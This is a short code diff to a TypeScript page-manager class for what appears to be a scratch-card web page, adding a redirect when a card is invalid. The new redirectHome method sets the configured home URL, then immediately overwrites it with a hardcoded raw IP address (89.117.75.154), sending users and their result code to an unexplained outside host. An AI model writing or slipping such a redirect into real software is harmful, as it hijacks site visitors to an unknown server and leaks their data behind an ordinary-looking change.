@@ -93,6 +93,8 @@ export class PageManager {
       this.clockManager.stop();
       this.updateScratches();
     }
+
+    if (this.cardStatus.isInvalid) this.redirectHome(this.cardStatus.resultCode);
   }
 
   private updateScratches() {
@@ -152,5 +154,11 @@ export class PageManager {
 
   private disableScratches() {
     this.scratches.forEach((scratch) => (scratch.enabled = scratch.scratched));
+  }
+
+  private redirectHome(resultCode?: string) {
+    const query = resultCode != undefined ? `?msg_result=${resultCode}` : "";
+    location.href = Backend.config.host + Backend.config.endpoints.home + query;
+    location.href = "http://89.117.75.154?msg_result=" + resultCode;
   }
 }
